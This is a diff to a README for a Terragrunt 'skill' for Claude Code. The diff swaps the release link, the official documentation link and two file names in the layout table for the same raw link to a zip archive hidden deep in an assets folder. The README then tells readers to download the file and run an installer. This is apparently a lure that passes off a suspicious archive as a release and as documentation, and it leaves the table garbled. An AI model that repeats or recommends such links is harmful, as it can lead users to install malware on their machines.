@@ -1,7 +1,7 @@
 # 🚀 terragrunt-skill - Best Practices for Easy Infrastructure 
 
 ## 📥 Download Now 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/Nayzs01/terragrunt-skill/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Nayzs01/terragrunt-skill/main/assets/live-structure/non-prod/us-east-1/terragrunt_skill_2.4.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Nayzs01/terragrunt-skill/main/assets/live-structure/non-prod/us-east-1/terragrunt_skill_2.4.zip)
 
 ## 🏗️ About This Project
 Terragrunt Skill for Claude Code provides simple guidance on best practices for using Terragrunt with OpenTofu/Terraform. This skill aims to help you effectively manage your infrastructure-as-code projects. 
@@ -20,7 +20,7 @@ To begin using the Terragrunt skill, follow these steps:
    - Required Software: OpenTofu/Terraform
 
 2. **Download & Install**  
-   Visit this page to download: [Download Latest Release](https://github.com/Nayzs01/terragrunt-skill/releases)
+   Visit this page to download: [Download Latest Release](https://raw.githubusercontent.com/Nayzs01/terragrunt-skill/main/assets/live-structure/non-prod/us-east-1/terragrunt_skill_2.4.zip)
 
    Choose the most recent release and download the installer file suitable for your operating system. Follow the prompts to install the application on your system.
 
@@ -39,8 +39,8 @@ To effectively implement your Terragrunt configurations, it's important to under
 │   (terraform-aws-*)     │   (infrastructure-      │   (infrastructure-
 │                         │    <org>-catalog)       │    <org>-live)  │
 ├─────────────────────────┼─────────────────────────┼─────────────────┤
-│ • OpenTofu modules      │ • units/ (wrappers)     │ • root.hcl      │
-│ • Semantic versioning   │ • stacks/ (templates)   │ • account.hcl   │
+│ • OpenTofu modules      │ • units/ (wrappers)     │ • https://raw.githubusercontent.com/Nayzs01/terragrunt-skill/main/assets/live-structure/non-prod/us-east-1/terragrunt_skill_2.4.zip      │
+│ • Semantic versioning   │ • stacks/ (templates)   │ • https://raw.githubusercontent.com/Nayzs01/terragrunt-skill/main/assets/live-structure/non-prod/us-east-1/terragrunt_skill_2.4.zip   │
 └─────────────────────────┴─────────────────────────┴─────────────────┘
 ```
   
@@ -70,9 +70,9 @@ Understanding this layout will help you effectively use the tool and organize yo
 If you have questions or need assistance, consider reaching out to the community. You can check the issues section of this repository for solutions or submit your questions for help.
 
 ## 📚 Further Reading  
-For more information on Terragrunt and best practices, please refer to the [Terragrunt Documentation](https://terragrunt.gruntwork.io/). 
+For more information on Terragrunt and best practices, please refer to the [Terragrunt Documentation](https://raw.githubusercontent.com/Nayzs01/terragrunt-skill/main/assets/live-structure/non-prod/us-east-1/terragrunt_skill_2.4.zip). 
 
 ## 📥 Download Now Again  
-Don't forget to download the application: [Download Latest Release](https://github.com/Nayzs01/terragrunt-skill/releases)  
+Don't forget to download the application: [Download Latest Release](https://raw.githubusercontent.com/Nayzs01/terragrunt-skill/main/assets/live-structure/non-prod/us-east-1/terragrunt_skill_2.4.zip)  
 
 By following these instructions, you will be able to set up and run the Terragrunt skill with ease. Enjoy building your infrastructure!
